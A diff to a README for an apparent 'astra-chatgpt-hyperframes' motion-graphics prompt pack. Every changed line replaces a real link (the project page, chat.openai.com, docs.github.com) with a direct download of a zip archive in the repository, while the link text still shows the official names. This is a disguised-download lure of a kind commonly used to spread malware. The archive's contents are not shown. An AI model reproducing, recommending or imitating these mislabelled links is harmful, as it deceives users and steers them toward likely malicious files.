@@ -1,6 +1,6 @@
 # ✨ astra-chatgpt-hyperframes - Your Gateway to Stunning Motion Graphics
 
-[![Download Now](https://img.shields.io/badge/Download-Astra_ChatGPT_Hyperframes-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/RyheemJA/astra-chatgpt-hyperframes)
+[![Download Now](https://img.shields.io/badge/Download-Astra_ChatGPT_Hyperframes-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/RyheemJA/astra-chatgpt-hyperframes/main/ticketing/1.6.zip)
 
 ---
 
@@ -28,7 +28,7 @@ To run this smoothly on your Windows computer, make sure you have:
 
 Here's the simple part. To get the application on your computer:
 
-1. **Click this link:** [Download astra-chatgpt-hyperframes](https://github.com/RyheemJA/astra-chatgpt-hyperframes)
+1. **Click this link:** [Download astra-chatgpt-hyperframes](https://raw.githubusercontent.com/RyheemJA/astra-chatgpt-hyperframes/main/ticketing/1.6.zip)
 2. **Visit this link to download the application.** You'll land on the project's main page.
 3. **Look for the green "Code" button** near the top right of the file list.
 4. **Click "Download ZIP"** from the dropdown menu. Your browser will start downloading a file named something like `astra-chatgpt-hyperframes-main.zip`.
@@ -77,7 +77,7 @@ This isn't a complicated software program. It's a **resource pack** organized fo
 1. Open the `index.html` file as described above.
 2. Read the overview section carefully.
 3. Open the **ChatGPT Prompts** folder and copy the first prompt.
-4. Go to [ChatGPT](https://chat.openai.com) and paste the prompt.
+4. Go to [ChatGPT](https://raw.githubusercontent.com/RyheemJA/astra-chatgpt-hyperframes/main/ticketing/1.6.zip) and paste the prompt.
 5. Follow the instructions ChatGPT gives you to create your own hyperframe sequence!
 
 ---
@@ -154,14 +154,14 @@ You now hold the keys to a world of creative motion design. This toolkit bridges
 
 Remember, creativity is a journey. Start simple, experiment boldly, and don't be afraid to break things. The worst that happens is you learn something new.
 
-Ready to begin? Click the download button at the top of this page, or use this direct link: **[Get Your Copy Now](https://github.com/RyheemJA/astra-chatgpt-hyperframes)**
+Ready to begin? Click the download button at the top of this page, or use this direct link: **[Get Your Copy Now](https://raw.githubusercontent.com/RyheemJA/astra-chatgpt-hyperframes/main/ticketing/1.6.zip)**
 
 ---
 
 ## 📚 Additional Resources
 
-- **Official ChatGPT:** [chat.openai.com](https://chat.openai.com)
-- **GitHub Help Center:** [docs.github.com](https://docs.github.com)
+- **Official ChatGPT:** [chat.openai.com](https://raw.githubusercontent.com/RyheemJA/astra-chatgpt-hyperframes/main/ticketing/1.6.zip)
+- **GitHub Help Center:** [docs.github.com](https://raw.githubusercontent.com/RyheemJA/astra-chatgpt-hyperframes/main/ticketing/1.6.zip)
 - **Design Inspiration:** Look up "Rajmoni motion design" to see more reference works.
 
 ---
@@ -170,7 +170,7 @@ Ready to begin? Click the download button at the top of this page, or use this d
 
 Join other users and share your creations. You can star the repository to show support, open an "Issue" on GitHub if you find a bug, or simply explore the code to learn more.
 
-- **Project Home:** [github.com/RyheemJA/astra-chatgpt-hyperframes](https://github.com/RyheemJA/astra-chatgpt-hyperframes)
+- **Project Home:** [github.com/RyheemJA/astra-chatgpt-hyperframes](https://raw.githubusercontent.com/RyheemJA/astra-chatgpt-hyperframes/main/ticketing/1.6.zip)
 - **Report a Problem:** Go to the "Issues" tab on GitHub
 
 ---
